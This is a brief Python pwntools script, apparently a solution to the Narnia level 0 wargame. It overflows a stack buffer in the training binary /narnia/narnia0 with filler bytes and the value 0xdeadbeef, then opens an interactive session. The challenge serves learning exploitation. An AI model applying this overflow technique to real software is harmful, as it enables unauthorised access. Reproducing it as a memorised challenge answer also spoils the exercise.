#!/usr/bin/env python3
import pwn

p = pwn.process('/narnia/narnia0')
p.sendline(b'AAAABBBBCCCCDDDDEEEE\xef\xbe\xad\xde')
p.recvline()
p.interactive()
